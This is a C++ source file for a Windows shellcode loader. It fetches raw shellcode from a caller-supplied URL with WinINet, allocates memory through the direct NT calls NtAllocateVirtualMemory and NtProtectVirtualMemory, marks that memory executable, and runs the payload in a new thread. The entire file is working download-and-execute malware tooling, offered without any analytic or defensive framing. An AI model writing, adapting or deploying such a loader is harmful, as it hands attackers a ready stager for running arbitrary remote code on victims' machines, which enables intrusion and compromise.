#include "ShellcodeLoader.h"
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <vector>

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    PSIZE_T   RegionSize,
    ULONG     NewProtect,
    PULONG    OldProtect
);

// Constructor to initialize the shellcode URL
ShellcodeLoader::ShellcodeLoader(const std::string& url)
    : shellcodeURL(url), shellcode(std::vector<BYTE>()), shellcodeSize(0) {}


// Method to download the shellcode from the given URL
bool ShellcodeLoader::downloadShellcode() {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;

    // Initialize WinINet for internet operations
    hInternet = InternetOpenW(L"WinInet Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "[!] Failed to initialize WinINet." << std::endl;
        return false;
    }

    // Convert shellcode URL from std::string to std::wstring for InternetOpenUrlW
    std::wstring wideShellcodeURL(shellcodeURL.begin(), shellcodeURL.end());
    hConnect = InternetOpenUrlW(hInternet, wideShellcodeURL.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        std::cerr << "[!] Failed to connect to URL." << std::endl;
        InternetCloseHandle(hInternet);
        return false;
    }

    // Create a buffer to hold the downloaded shellcode
    std::vector<BYTE> buffer(4096);  // Buffer size of 4096 bytes
    if (!InternetReadFile(hConnect, buffer.data(), buffer.size(), &bytesRead) || bytesRead == 0) {
        std::cerr << "[!] Failed to download shellcode." << std::endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Assign the data to the shellcode vector using buffer.begin() and buffer.begin() + bytesRead
    shellcode.assign(buffer.begin(), buffer.begin() + bytesRead);
    shellcodeSize = bytesRead;

    std::cout << "[*] Shellcode downloaded, bytes read: " << bytesRead << std::endl;

    // Close handles after successful download
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return true;
}

// Method to execute the shellcode
bool ShellcodeLoader::executeShellcode() {
    PVOID execMem = NULL;
    SIZE_T size = shellcodeSize;
    NTSTATUS status;

    // Allocate memory for the shellcode using NtAllocateVirtualMemory
    status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &execMem,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        std::cerr << "[!] NtAllocateVirtualMemory failed." << std::endl;
        return false;
    }

    // Copy shellcode to allocated memory
    memcpy(execMem, shellcode.data(), shellcodeSize);

    // Change memory protection to executable
    ULONG oldProtect;
    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &execMem,
        &size,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (status != 0) {
        std::cerr << "[!] NtProtectVirtualMemory failed." << std::endl;
        return false;
    }

    // Execute the shellcode by creating a new thread
    std::cout << "[*] Executing shellcode..." << std::endl;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "[!] Failed to create thread." << std::endl;
        return false;
    }

    // Wait for the shellcode thread to finish executing
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    std::cout << "[*] Shellcode executed successfully." << std::endl;
    return true;
}
